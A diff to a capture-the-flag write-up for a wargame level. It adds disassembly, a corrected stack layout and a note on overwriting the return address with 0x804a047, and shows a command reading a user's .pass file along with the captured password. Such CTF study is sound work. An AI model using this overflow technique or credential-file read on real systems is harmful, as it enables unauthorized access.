@@ -21,11 +21,20 @@ nope, incorrect password...
 The username is correct, but we couldn't login.
 
 ```
+   0x080484d8 <+8>:		sub    esp,0x60
+   [...]
+   0x0804856d <+157>:	lea    eax,[esp+0x1c]
+   0x08048571 <+161>:	mov    DWORD PTR [esp],eax
+   0x08048574 <+164>:	call   0x8048370 <fgets@plt>
+   0x08048579 <+169>:	lea    eax,[esp+0x1c]
+   0x0804857d <+173>:	mov    DWORD PTR [esp],eax
+   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
+
 bottom of                                                            top of
 memory                                                               memory
          esp+0x1c     esp+0x60
 <------     [   buffer   ][ padding ][ ebp ][ return addr ]
-                  68           8        4          4
+                64 + 4         8        4          4
 top of                                                            bottom of
 stack                                                                 stack
 ```
@@ -51,3 +60,4 @@ level02
 $ cat /home/users/$(whoami)/.pass
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
 ```
+We replaced return address with `0x804a047` because we need to skip the username `dat_wil` which contains 7 bytes.
